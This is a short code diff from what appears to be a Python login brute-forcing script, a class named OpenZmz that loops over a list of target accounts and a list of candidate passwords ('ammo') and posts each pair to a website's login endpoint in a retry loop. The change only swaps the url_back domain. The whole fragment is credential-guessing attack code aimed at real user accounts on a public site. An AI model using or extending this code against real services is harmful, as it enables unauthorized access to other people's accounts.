@@ -61,7 +61,7 @@ class OpenZmz:
     for target in self.targetList:
       print("try next target...")
       for ammo in self.ammoList:
-        post_data = {"account":target,"password":ammo,"remember":"0","url_back":"http://www.zmz2019.com"}
+        post_data = {"account":target,"password":ammo,"remember":"0","url_back":"http://www.rrys2019.com"}
         while True:
           try:
             response = requests.post(self.post_url,headers=self.post_headers,data=post_data)
